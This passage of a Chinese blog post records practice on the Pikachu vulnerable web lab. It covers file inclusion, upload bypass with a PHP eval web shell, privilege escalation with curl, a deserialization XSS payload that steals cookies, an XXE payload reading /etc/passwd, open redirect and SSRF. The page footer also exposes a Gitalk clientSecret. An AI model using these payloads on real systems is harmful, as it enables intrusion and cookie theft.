+<p>然后想通过这个<code>../../../../../etc/passwd</code>包含一下passwd，却报错：</p>
+<blockquote>
+<p>Warning: include(): open_basedir restriction in effect. File(&#x2F;etc&#x2F;passwd) is not within the allowed path(s): (&#x2F;www&#x2F;pikachu-master&#x2F;:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;) in &#x2F;www&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php on line 23</p>
+<p>Warning: include(&#x2F;etc&#x2F;passwd): failed to open stream: Operation not permitted in &#x2F;www&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php on line 23</p>
+<p>Warning: include(): Failed opening ‘include&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd’ for inclusion (include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;phpstudy&#x2F;soft&#x2F;php&#x2F;php-5.5.38&#x2F;lib&#x2F;php’) in &#x2F;www&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php on line 23</p>
+</blockquote>
+<p>好像是PHP相关的权限设置问题，吧</p>
+<h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h3><p>界面和上面一样，但是URL变成了这样：<br><code>filename=include%2Ffile1.php</code><br>其实就是代码中去掉了<code>include/</code>的前缀限制，使得能够包含远程文件<br>例如直接传入一个远程托管的PHP代码地址：<br><code>https://github.com/zhuifengshaonianhanlu/pikachu/blob/master/footer.php</code><br>页面就会变得很奇怪</p>
+<p>最后最好学一下PHP include的用法</p>
+<h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><h3 id="概述-5"><a href="#概述-5" class="headerlink" title="概述"></a>概述</h3><p>类似于任意文件读取，就是对于下载服务器上资源的参数不加以限制<br>用户能够任意操作，从而下载服务器敏感文件</p>
+<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>一个NBA球星页面，点击连接，GET请求传递filename参数<br><code>filename=kb.png</code><br>从而下载文件</p>
+<p>passwd文件有权限限制，<code>../../../../../tmp/mysql.sock</code>能下</p>
+<h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><h3 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h3><p>上传头像、附件等场景</p>
+<p>一般防范措施：</p>
+<ul>
+<li>验证文件类型、后缀、大小</li>
+<li>验证文件上传方式</li>
+<li>对上传后的文件进行一定复杂的重命名</li>
+<li>不要暴露文件上传后的路径</li>
+</ul>
+<h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>页面说只允许上传图片，哦</p>
+<p>POST上传，上传后给出文件保存路径</p>
+<p>准备好一句话：<code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code><br>直接上传，发现被拦了</p>
+<p>抓包改包重放（下面的GET方法要改成POST）</p>
+<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211123101014334.png" alt="image-20211123101014334"></p>
+<p>发现就可以了，并且给出了上传路径，蚁剑连连看，OK</p>
+<p>总之解释，只在前端做了防护，随便绕</p>
+<h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>页面和上面一样，但是可以选择php文件，变成点击上传后返回错误信息</p>
+<p>抓包，将原本的Content-Type：<br><code>application/x-php</code>-&gt;<code>image/png</code><br>然后就上传成功了</p>
+<p>蚁剑连接，OK</p>
+<p>看看源码，发现是只对MIME type进行了检验</p>
+<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>页面还是和上面一样<br>提示说用了PHP的getimagesize()函数<br>冲冲浪，是根据图像返回图像的大小及相关信息<br>估计要求上传的文件中真的包含图像内容</p>
+<p>单纯改Content-Type行不通</p>
+<p>那就改上传正常图片的那个包，在内容最后面加上一句话<br>可以上传，并且给出了上传路径（00阶段绕不过）</p>
+<p>上传后的是png图片，不会被当成php脚本解析</p>
+<p>利用前面的文件包含漏洞打<strong>组合拳</strong>：<br><code>http://www.pikachu.com/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/11/23/203135619c5879b7563285308197.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code><br>蚁剑能够连接这个URL</p>
+<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><h3 id="概述-7"><a href="#概述-7" class="headerlink" title="概述"></a>概述</h3><p>越权，就是越权<br>又有分水平越权和垂直越权两种</p>
+<p>权限管理一般应遵循的原则：</p>
+<ul>
+<li>使用最小特权原则对用户进行授权</li>
+<li>使用合理（严格）的权限校验规则</li>
+<li>使用后台登录态作为权限判断条件，尽量避免使用前端传入条件</li>
+</ul>
+<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>lucy用户登入，查看信息，发现URL里有个username参数指定了是lucy<br>改成lili，就以用户lucy越权看到了lili的信息</p>
+<p>就是说，前面的登入是多余的，是失效鉴权</p>
+<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>两个用户，pikachu就是个宝可梦，而admin是超级用户<br>pikachu只能看，而admin还能增删用户</p>
+<p><del>靶场这里比较不方便，不管什么用户都只用一个PHPSESSID标识浏览器</del><br><del>所以kali里面只有一个浏览器的话，不太好测试越权</del><br><del>但是可以使用curl命令</del><br>我是傻逼</p>
+<p>先在浏览器上分别登入两个用户，并各自执行特殊操作<br>抓包看看请求接口和发送的数据<br>猜测一些管理员接口没有做鉴权</p>
+<p>于是把管理员添加用户的数据包放到repeater<br>然后退出admin，登入pikachu，获得pikachu的登录态<br>然后把那个数据包的PHPSESSID换成pikachu的<br>重放，就相当于以pikachu执行admin的操作<br>结果成功，即存在垂直越权</p>
+<hr>
+<p>下面是一些curl的命令（虽然是犯傻，但也顺便学习一遍）</p>
+<p>登入：<br><code>curl http://www.pikachu.com/vul/overpermission/op2/op2_login.php -L -b &quot;PHPSESSID=gns88d3jopdfi4reg0t1lesag1&quot; -d &quot;username=pikachu&amp;password=000000&amp;submit=Login&quot; | sed -n &#39;/&lt;div class=&quot;main-content/,/&lt;div class=&quot;footer/p&#39;</code></p>
+<p>执行admin操作：<br><code>curl http://www.pikachu.com/vul/overpermission/op2/op2_admin_edit.php -L -b &quot;PHPSESSID=gns88d3jopdfi4reg0t1lesag1&quot; -d &quot;username=Archeri&amp;password=password&amp;sex=111&amp;phonenum=111&amp;email=111&amp;address=111&amp;submit=%E5%88%9B%E5%BB%BA&quot; | sed -n &#39;/&lt;div class=&quot;main-content/,/&lt;div class=&quot;footer/p&#39;</code></p>
+<h2 id=""><a href="#" class="headerlink" title="..&#x2F;..&#x2F;"></a>..&#x2F;..&#x2F;</h2><h3 id="概述-8"><a href="#概述-8" class="headerlink" title="概述"></a>概述</h3><p>差不多也是请求文件的变量被用户控制并没有严格限制<br>导致目录遍历</p>
+<p>和敏感信息泄露的区别：<br>通过不带参数的URL（比如：<a target="_blank" rel="noopener" href="http://xxx/doc%EF%BC%89%E5%AF%BC%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%8C%E8%BF%99%E5%8F%AB%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">http://XXX/doc）导出了doc文件夹里的内容，这叫敏感信息泄露</a><br>带参数，且能够用..&#x2F;..&#x2F;，一般叫目录遍历</p>
+<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p>两个链接，点击之后下面出现对应文本<br>其中URL里有个值得注意的参数：<code>?title=truman.php</code><br>这里就是漏洞点，和文件包含差不多</p>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="概述-9"><a href="#概述-9" class="headerlink" title="概述"></a>概述</h3><p>一些常见场景</p>
+<ul>
+<li>通过访问URL下的目录，可以直接列出目录下的文件列表</li>
+<li>输入错误的URL参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息</li>
+<li>前端的源码（HTML、CSS、JS）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等</li>
+</ul>
+<h3 id="I-can-see-your-ABC"><a href="#I-can-see-your-ABC" class="headerlink" title="I can see your ABC"></a>I can see your ABC</h3><p>HTML源码里面，有一段注释暴露了测试账号：lili&#x2F;123456</p>
+<p>还有一个逻辑错误，记下登陆后的URL，退出登录后可以无授权访问</p>
+<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="概述-10"><a href="#概述-10" class="headerlink" title="概述"></a>概述</h3><p>PHP的两个函数</p>
+<p>**serialize()**：把对象变成可传输的字符串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();		<span class="comment">//创建一个对象</span></span><br><span class="line"><span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);	<span class="comment">//把这个对象进行序列化</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化后的结果：<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</code></p>
+<ul>
+<li><p>O：表示Object</p>
+</li>
+<li><p>1：表示对象名字长度为一个字符</p>
+</li>
+<li><p>“S”：对象名称</p>
+</li>
+<li><p>1：对象里有一个变量</p>
+</li>
+<li><p>s：数据类型（字符串）</p>
+</li>
+<li><p>4：变量名称长度</p>
+</li>
+<li><p>“test”：变量名称</p>
+</li>
+<li><p>s：数据类型</p>
+</li>
+<li><p>7：变量值长度</p>
+</li>
+<li><p>“pikachu”：变量值</p>
+</li>
+</ul>
+<hr>
+<p>**unserialize()**：将被序列化为字符串的对象还原</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test;	<span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>如果反序列化内容能被用户控制<br>且后台不正当使用PHP中的魔法函数<br>则可能有安全问题</p>
+<p>一些常见的相关魔法函数：</p>
+<ul>
+<li><p>__construct()：对象创建时调用</p>
+</li>
+<li><p>__destruct()：对象销毁时调用</p>
+</li>
+<li><p>__toString()：对象被当作字符串时调用</p>
+</li>
+<li><p>__sleep()：对象被序列化前运行</p>
+</li>
+<li><p>__wakeup()：对象序列化之后立即调用</p>
+</li>
+</ul>
+<hr>
+<p>一个漏洞例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload：<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>
+<p>大概就是传入恶意字符串，反序列化之后执行echo达成XSS的意思</p>
+<h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h3><p>后端相关源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 后面echo $html在页面中</span></span><br></pre></td></tr></table></figure>
+
+<p>估计反序列化漏洞，一般都是白盒测试代码审计出来的吧</p>
+<p>根据上面的源码，知道对象S会在创建时echo自己的变量<br>但其实这个不重要<br>重要的是下面的代码，会尝试反序列化后，把<code>$html</code>的内容echo出来</p>
+<p>所以就有一个很普通的XSS<br>所以最基本的弹窗payload：<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code><br>后面修改变量的长度和字符串值，就可以达成其他目的<br>例如收集cookie：<br><code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:109:&quot;&lt;script&gt;document.location=&quot;http://www.pikachu.com/pkxss/xcookie/cookie.php?cookie=&quot;+document.cookie;&lt;/script&gt;&quot;;&#125;</code></p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="概述-11"><a href="#概述-11" class="headerlink" title="概述"></a>概述</h3><p>XML外部实体注入，又来啦</p>
+<p>通过向服务器注入指定的XML实体内容<br>让服务器按照指定的配置进行执行，从而导致问题</p>
+<p>现在很多语言里面对应的解析XML的函数默认是禁止解析外部实体内容的<br>从而也就直接避免了这个漏洞<br>以PHP为例<br>在PHP里面解析XML用的是libxml<br>其在≥2.9.0的版本中默认是禁止解析XML外部实体内容的。</p>
+<p>靶场手动指定LIBXML_NOENT选项开启了XML外部实体解析</p>
+<p>总之很可能出现在接收和解析XML数据的地方</p>
+<h3 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h3><p>本地复现8太行，按照提示URL编码也不行<br>可能是环境配置的问题，下面是payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;  encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE name [</span><br><span class="line"> &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="不安全的URL重定向"><a href="#不安全的URL重定向" class="headerlink" title="不安全的URL重定向"></a>不安全的URL重定向</h2><h3 id="概述-12"><a href="#概述-12" class="headerlink" title="概述"></a>概述</h3><p>可能发生在一切执行了URL跳转的地方<br>主要是后端对前端传过来的参数没有加以判断就去跳转</p>
+<p>一个直接危害：钓鱼<br>即攻击者使用漏洞方的域名做掩盖，从而跳转到钓鱼网站</p>
+<h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><p>四个点击项，其中后面两个发出的请求有个参数<code>url</code><br>看样子是页面会根据这个参数的值进行跳转</p>
+<p>那可能有这个payload：<br><code>http://www.pikachu.com/vul/urlredirect/urlredirect.php?url=http://www.baidu.com</code></p>
+<p>就是利用pikachu的域名钓到百度去的意思？</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="概述-13"><a href="#概述-13" class="headerlink" title="概述"></a>概述</h3><p>主要原因：<br>服务端提供了从其他服务器应用获取数据的功能<br>但又没有对目标地址做严格过滤与限制</p>
+<p>导致攻击者可以传入任意地址来让后端对其发起请求<br>并返回该目标地址请求的数据</p>
+<p>PHP中的常见相关函数（利用方法和影响不同）：</p>
+<ul>
+<li>file_get_contents()</li>
+<li>fsockopen()</li>
+<li>curl_exec()</li>
+</ul>
+<h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>看样子估计是会使用curl对参数<code>url</code>中的网址进行请求<br>估计利用点就是，请求攻击者服务器上的恶意脚本<br>在受害者服务器上运行</p>
+<p>或者可以探测内网：<code>http://10.10.10.2:3306</code></p>
+<h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h3><p>估计就是通过<code>file</code>参数获取服务器上的敏感信息<br>好像也可以起到和curl类似的效果</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很简陋的靶场<br>提示和没提示一样</p>
+	
+		</div>
+		
+		<div id="current-post-cover" data-scr="/img/post-cover/default.jpg"></div>
+
+		<!-- relate post, comment...-->
+		<div class="investment-container">
+			<div class="investment-header">
+				<div class="investment-title-1">
+					<div class="on">相关文章</div>
+					<div>评论</div>
+					<!-- <div>分享</div> -->
+				</div>
+				<div class="investment-title-2">	            
+					
+	<span>
+		<a id="totop-post-page">返回顶部</a>
+		
+			<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
+
+
+      		
+				</div>	
+			</div>
+			
+			<div class="investment-content">
+				<div class="investment-content-list">
+					
+
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">
+								PHP-Web渗透中常见的高危函数以及伪协议			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 4日, 2023				
+							</p>
+							<p class="relate-post-content">
+								代码执行函数eval
+代码：&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;
+利用：http://10.10.10.3/test.php?cmd=phpinfo();
+assert
+代码：&lt;?...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/05/04/PHP-Web%E6%B8%97%E9%80%8F%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0%E4%BB%A5%E5%8F%8A%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHP-Web渗透中常见的高危函数以及伪协议">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/PHP.png" alt="PHP-Web渗透中常见的高危函数以及伪协议"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">
+								Web靶场-DSVW			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 25日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] DSVW靶场练习笔记前言是针对DSVW靶场的练习笔记是在搞完Pikachu靶场之后在整理vulnstack的Web安全入门进阶靶场时发现的里面版本比较老，就单独搞出来玩玩
+最新版本v0.2b用Python 3运行代码很顶...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/10/25/Web%E9%9D%B6%E5%9C%BA-DSVW/" title="Web靶场-DSVW">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-DSVW"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">
+								一些BurpSuite进阶使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								五月 10日, 2022				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Burp Suite进阶前言目前只是些平时练习过程中接触到的BP进阶使用方法和技巧
+后续再考虑找些专门的教程学学
+使用宏抓取页面token下面以抓取pikachu靶场爆破模块的token为例
+来自于g0tmi1k的文章
+...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2022/05/10/%E4%B8%80%E4%BA%9BBurpSuite%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/" title="一些BurpSuite进阶使用">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/burpsuite.png" alt="一些BurpSuite进阶使用"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/10/17/OWASP-Cross-Site-Request-Forgery-CSRF/" title="OWASP Cross Site Request Forgery (CSRF)">
+								OWASP Cross Site Request Forgery (CSRF)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十月 17日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] OWASP Cross Site Request Forgery (CSRF)前言是对OWASP针对CSRF攻击进行讲解的网站的学习笔记只记录自己感兴趣的或者是不熟的
+原文在这里
+概述
+Cross-Site Reques...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/10/17/OWASP-Cross-Site-Request-Forgery-CSRF/" title="OWASP Cross Site Request Forgery (CSRF)">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/OWASP.jpg" alt="OWASP Cross Site Request Forgery (CSRF)"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">
+								Linux攻防-权限维持及痕迹隐藏			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								六月 17日, 2023				
+							</p>
+							<p class="relate-post-content">
+								零、Linux下的控守技术概述控守技术可以理解为权限维持技术，泛指攻击者获取目标机器的控制权限后，将该权限长久维持的技术和方法
+这里主要分为两大类：
+
+权限维持：能够在失去当前控制权限时，下次能更容易地重获权限的方法
+痕迹隐藏：能够使...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2023/06/17/Linux%E6%94%BB%E9%98%B2-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%8F%8A%E7%97%95%E8%BF%B9%E9%9A%90%E8%97%8F/" title="Linux攻防-权限维持及痕迹隐藏">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux企鹅.png" alt="Linux攻防-权限维持及痕迹隐藏"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/10/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量">
+								Linux环境变量			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 10日, 2021				
+							</p>
+							<p class="relate-post-content">
+								前言学，以前一直没会
+以Kali Linux 2021.2为例
+资料1资料2
+概述Linux环境变量包括：系统级、用户级系统级环境变量：每个登录到系统的用户都要读取的用户级环境变量：用户使用系统时加载的
+相关命令export：设置或显...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/10/Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/" title="Linux环境变量">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/Linux环境变量.png" alt="Linux环境变量"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
